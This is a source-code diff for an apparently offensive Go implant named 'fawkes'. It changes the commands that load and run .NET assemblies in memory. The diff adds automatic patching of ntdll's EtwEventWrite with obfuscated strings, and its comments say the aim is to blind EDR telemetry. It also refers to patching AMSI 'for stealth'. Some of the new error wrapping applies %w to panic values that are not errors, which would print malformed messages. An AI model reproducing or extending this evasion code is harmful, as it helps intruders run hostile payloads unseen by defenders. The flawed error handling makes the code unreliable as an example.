@@ -30,13 +30,13 @@ package commands
 
 import (
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"runtime"
 	"strings"
 	"sync"
 	"time"
 
+	"fawkes/pkg/obfuscate"
 	"fawkes/pkg/structs"
 
 	"github.com/Ne0nd0g/go-clr"
@@ -47,6 +47,7 @@ var (
 	runtimeHost   *clr.ICORRuntimeHost
 	clrStarted    bool
 	amsiPatched   bool // tracks whether AMSI was patched via start-clr
+	etwPatched    bool // tracks whether ETW was patched (auto_patch, start-clr, or auto)
 )
 
 // ExecuteNETAssembly is a shared helper that executes a .NET assembly in memory
@@ -76,13 +77,30 @@ func ExecuteNETAssembly(assemblyBytes []byte, args []string) (string, error) {
 		}
 		if loadErr != nil {
 			assemblyMutex.Unlock()
-			return "", fmt.Errorf("CLR initialization failed: %v", loadErr)
+			return "", fmt.Errorf("CLR initialization failed: %w", loadErr)
 		}
 		clrStarted = true
 		sb.WriteString("[+] CLR started\n")
 		sb.WriteString("[!] WARNING: AMSI not patched — run 'start-clr' with Autopatch for stealth\n")
 	}
 	assemblyMutex.Unlock()
+
+	// Auto-patch ETW if not already done — .NET Framework CLR emits Assembly.Load
+	// and JIT events through ntdll!EtwEventWrite, visible to EDRs.
+	if !etwPatched {
+		ntdll := obfuscate.NtdllDll()
+		defer obfuscate.Zero(ntdll)
+		etwFunc := obfuscate.EtwEventWrite()
+		defer obfuscate.Zero(etwFunc)
+
+		if _, err := PerformRetPatch(ntdll, etwFunc); err != nil {
+			if !strings.Contains(err.Error(), "already patched") {
+				sb.WriteString(fmt.Sprintf("[-] ETW auto-patch warning: %v\n", err))
+			}
+		} else {
+			etwPatched = true
+		}
+	}
 
 	// Load assembly
 	assemblyMutex.Lock()
@@ -91,7 +109,7 @@ func ExecuteNETAssembly(assemblyBytes []byte, args []string) (string, error) {
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
-				loadErr = fmt.Errorf("PANIC during LoadAssembly: %v", r)
+				loadErr = fmt.Errorf("PANIC during LoadAssembly: %w", r)
 			}
 		}()
 		methodInfo, loadErr = clr.LoadAssembly(runtimeHost, assemblyBytes)
@@ -113,7 +131,7 @@ func ExecuteNETAssembly(assemblyBytes []byte, args []string) (string, error) {
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
-				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %v", r)
+				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %w", r)
 			}
 		}()
 		stdout, stderr = clr.InvokeAssembly(methodInfo, args)
@@ -121,7 +139,7 @@ func ExecuteNETAssembly(assemblyBytes []byte, args []string) (string, error) {
 	assemblyMutex.Unlock()
 
 	if invokeErr != nil {
-		return sb.String(), fmt.Errorf("Invoke error: %v", invokeErr)
+		return sb.String(), fmt.Errorf("Invoke error: %w", invokeErr)
 	}
 
 	if stdout != "" {
@@ -168,10 +186,9 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 	}
 
 	// Parse parameters
-	var params InlineAssemblyParams
-	err := json.Unmarshal([]byte(task.Params), &params)
-	if err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	params, parseErr := unmarshalParams[InlineAssemblyParams](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	// Validate assembly_b64
@@ -243,6 +260,19 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 	}
 	assemblyMutex.Unlock()
 
+	// Auto-patch ETW before loading assembly — CLR emits Assembly.Load events
+	if !etwPatched {
+		ntdll := obfuscate.NtdllDll()
+		defer obfuscate.Zero(ntdll)
+		etwFunc := obfuscate.EtwEventWrite()
+		defer obfuscate.Zero(etwFunc)
+
+		if _, patchErr := PerformRetPatch(ntdll, etwFunc); patchErr == nil {
+			etwPatched = true
+			output.WriteString("[+] ETW auto-patched (CLR telemetry silenced)\n")
+		}
+	}
+
 	// Step 1: Load the assembly (Merlin approach)
 	output.WriteString("[*] Loading assembly into CLR...\n")
 
@@ -254,7 +284,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
-				loadErr = fmt.Errorf("PANIC during LoadAssembly: %v", r)
+				loadErr = fmt.Errorf("PANIC during LoadAssembly: %w", r)
 			}
 		}()
 
@@ -305,7 +335,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
-				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %v", r)
+				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %w", r)
 			}
 		}()
 
